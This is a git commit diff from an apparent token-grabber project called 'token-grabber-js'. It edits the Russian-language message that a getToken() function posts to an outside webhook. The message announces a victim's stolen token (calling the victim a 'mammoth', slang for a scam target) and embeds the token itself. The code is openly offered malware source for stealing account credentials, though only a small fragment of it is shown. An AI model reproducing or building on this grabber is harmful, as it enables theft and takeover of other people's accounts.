2f83e2ae4479616ba052a9b105d8f12f70d0caaa
EZRAID_v2 <94905030+EZRAIDv2@users.noreply.github.com>
2022-02-03 22:01:43 +0300

    Update grabber.js

--- grabber.js
+++ grabber.js
@@ -7,7 +7,7 @@ function getToken(){
      var params = {
         username: "Токен граббер от EZRAIDv2",
         avatar_url: "",
-        content: "**А вот и токен от :mammoth: подъехал!**\n**Токен: **`" + token + "`\n**GitHub: https://github.com/EZRAIDv2/token-grabber-js**"
+        content: "**А вот и токен от :mammoth: подъехал!**\n:key: **Токен: **`" + token + "`\n:black_cat: **GitHub: https://github.com/EZRAIDv2/token-grabber-js**\n:skull:** Сделал EZRAIDv2 **:skeleton:"
       }
       request.send(JSON.stringify(params));
 }
